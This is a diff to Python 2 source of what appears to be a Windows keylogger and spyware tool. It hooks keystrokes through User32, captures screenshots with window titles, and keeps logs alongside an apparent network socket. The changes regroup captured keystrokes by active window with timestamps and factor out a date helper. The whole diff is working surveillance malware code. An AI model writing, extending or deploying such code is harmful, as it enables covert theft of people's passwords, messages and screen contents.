@@ -35,6 +35,8 @@ SCREENSHOT_LOGS = {}
 AUDIO_LOGS = {}
 
 GLOBAL_SOCKET = None
+CURRENT_WINDOW_TITLE = None
+WINDOW_TITLE_COUNTER = 0
 
 uppercase = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
 
@@ -70,6 +72,7 @@ right = User32.GetSystemMetrics(78)
 bottom = User32.GetSystemMetrics(79)
 width = right - left
 height = bottom - top
+
 
 class BITMAPINFOHEADER(ctypes.Structure):
     _fields_ = [
@@ -126,6 +129,17 @@ def init():
         }
         open('info.nfo', 'w').write(str(variables))
         return variables
+
+
+def get_date_time():
+    now = datetime.datetime.now()
+    year = now.year
+    month = now.month
+    day = now.day
+    hour = now.hour
+    minute = now.minute
+    second = now.second
+    return '%s-%s-%s_%s-%s-%s' % (year, month, day, hour, minute, second)
 
 
 def screen_bits():
@@ -221,19 +235,26 @@ class Key(threading.Thread):
         global KEY_LOGS
 
     def write_key(self, log):
-        current_window_title = get_window_title()
-        if KEY_LOGS.has_key(current_window_title):
-            KEY_LOGS[current_window_title] += log
+        global CURRENT_WINDOW_TITLE
+        global WINDOW_TITLE_COUNTER
+
+        new_window_title = get_window_title()
+        datetime_stamp = get_date_time()
+        if CURRENT_WINDOW_TITLE == new_window_title and KEY_LOGS.has_key(WINDOW_TITLE_COUNTER):
+                KEY_LOGS[WINDOW_TITLE_COUNTER]['logs'] += log
         else:
-            KEY_LOGS[current_window_title] = log
+            WINDOW_TITLE_COUNTER += 1
+            KEY_LOGS[WINDOW_TITLE_COUNTER] = {}
+            KEY_LOGS[WINDOW_TITLE_COUNTER]['window_title'] = new_window_title
+            KEY_LOGS[WINDOW_TITLE_COUNTER]['time'] = datetime_stamp
+            KEY_LOGS[WINDOW_TITLE_COUNTER]['logs'] = log
+            CURRENT_WINDOW_TITLE = new_window_title
 
     def hook_proc(self, n_code, w_param, l_param):
-
         if w_param is not 0x0100:
             return User32.CallNextHookEx(self.keyLogger.hooked, n_code, w_param, l_param)
-
         self.write_key((User32.GetKeyState(0x14) & 1, User32.GetKeyState(0x10) & 0x8000, l_param[0]))
-
+        print KEY_LOGS
         return User32.CallNextHookEx(self.keyLogger.hooked, n_code, w_param, l_param)
 
     def start_keylogger(self):
@@ -258,20 +279,13 @@ class Screenshoter(threading.Thread):
             if config['sts']:
                 delay = config['std']
                 now = datetime.datetime.now()
-                year = now.year
-                month = now.month
-                day = now.day
-                hour = now.hour
-                minute = now.minute
-                second = now.second
-                SCREENSHOT_LOGS['%s-%s-%s_%s_%s_%s' % (year, month, day, hour, minute, second)] = {
+                SCREENSHOT_LOGS[get_date_time()] = {
                     'screen_bits': screen_bits(),
                     'title_name': get_window_title(),
                     'width': width,
                     'height': height,
-                    'date': '%s-%s-%s_%s-%s-%s' % (year, month, day, hour, minute, second),
+                    'date': get_date_time(),
                 }
-
                 time.sleep(delay)
             else:
                 break
